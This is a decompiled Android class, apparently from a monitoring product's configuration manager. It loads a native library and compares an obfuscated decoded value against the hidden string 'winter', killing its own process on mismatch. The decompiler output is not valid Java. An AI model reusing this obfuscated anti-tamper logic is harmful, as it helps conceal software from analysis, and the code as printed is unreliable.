package com.vvt.configurationmanager;

import android.os.Process;
import android.os.SystemClock;
import c.v.c.P;
import com.vvt.ag.b;
import com.vvt.ak.a;

public class g
  implements f
{
  private static final boolean a;
  
  static
  {
    boolean bool = a.b;
    if (bool) {}
    for (bool = true;; bool = false)
    {
      a = bool;
      System.loadLibrary("fllgconfig");
      return;
    }
  }
  
  public void a(String paramString)
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = new int[6];
    Object tmp14_13 = localObject1;
    Object tmp15_14 = tmp14_13;
    Object tmp15_14 = tmp14_13;
    tmp15_14[0] = 119;
    tmp15_14[1] = 105;
    Object tmp24_15 = tmp15_14;
    Object tmp24_15 = tmp15_14;
    tmp24_15[2] = 110;
    tmp24_15[3] = 116;
    tmp24_15[4] = 101;
    tmp24_15[5] = 114;
    localObject1 = b.a((int[])localObject1);
    Object localObject2 = new c/v/c/P;
    ((P)localObject2).<init>();
    localObject2 = ((P)localObject2).v(paramString);
    bool1 = ((String)localObject1).equals(localObject2);
    if (!bool1)
    {
      int i = Process.myPid();
      Process.killProcess(i);
    }
    for (;;)
    {
      return;
      long l = 1;
      SystemClock.sleep(l);
      boolean bool2 = a;
      if (!bool2) {}
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/configurationmanager/FxFileObserverWorker.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */